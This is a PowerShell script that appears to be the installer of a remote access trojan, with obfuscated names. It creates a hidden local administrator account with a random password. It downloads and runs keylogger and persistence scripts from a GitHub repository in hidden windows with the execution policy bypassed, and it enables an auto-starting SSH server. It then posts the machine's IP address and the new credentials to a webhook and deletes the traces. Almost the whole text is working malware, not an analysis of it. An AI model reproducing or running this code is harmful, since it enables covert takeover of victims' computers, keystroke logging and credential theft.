function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

$location = pwd

# make admin
$sqbXFdLvyw = "admin" 
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes

# download and run registry
powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/registry/registry.ps1' -OutFile 'registry.ps1'"
powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/registry/auto_excutive.vbs' -OutFile 'excutive.vbs'"
powershell.exe -windowstyle hidden -ep unrestricted ./registry.ps1; powershell.exe -windowstyle hidden -ep unrestricted ./excutive.vbs

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

New-Item -Path $CRYnrkaDbe -Force
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $sqbXFdLvyw -Force # username
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote port
Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type

# send file to webhook
$link = ""
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"admin\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $link"

#create payloads folder
Set-Location $env:temp 
mkdir happy
mkdir sad

# cleanup
attrib +h +s +r C:/Users/admin
Set-Location $location
Remove-Item $CRYnrkaDbe -Force
Remove-Item install.ps1 -Force


